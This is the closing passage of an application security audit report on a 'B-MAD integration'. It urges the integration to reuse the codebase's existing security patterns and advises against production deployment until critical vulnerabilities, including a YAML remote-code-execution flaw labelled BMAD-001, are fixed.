The existing codebase has excellent security patterns (secure logger, Zod validation, ProviderConfig, prototype pollution protection, XSS sanitization). The B-MAD integration simply needs to **use these existing patterns** instead of bypassing them.

### Recommendation

**DO NOT deploy to production** until all CRITICAL vulnerabilities are fixed. The YAML RCE vulnerability (BMAD-001) alone could lead to complete system compromise.

---

**Report Generated:** 2025-11-22
**Next Review:** After remediation implementation
**Contact:** Application Security Team
